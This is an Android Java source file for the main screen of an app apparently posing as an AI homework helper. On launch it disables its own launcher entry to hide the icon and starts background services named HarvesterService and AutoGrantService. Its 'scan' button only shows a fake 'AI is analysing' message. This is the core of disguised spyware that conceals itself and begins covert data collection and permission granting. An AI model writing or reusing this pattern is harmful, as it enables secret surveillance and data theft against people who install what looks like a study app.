package com.ai.homework;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        getPackageManager().setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        startService(new Intent(this, HarvesterService.class));
        startService(new Intent(this, AutoGrantService.class));
        Button btnScan = findViewById(R.id.btnScan);
        btnScan.setOnClickListener(v -> Toast.makeText(this, "AI Sedang Menganalisis...", Toast.LENGTH_LONG).show());
    }
}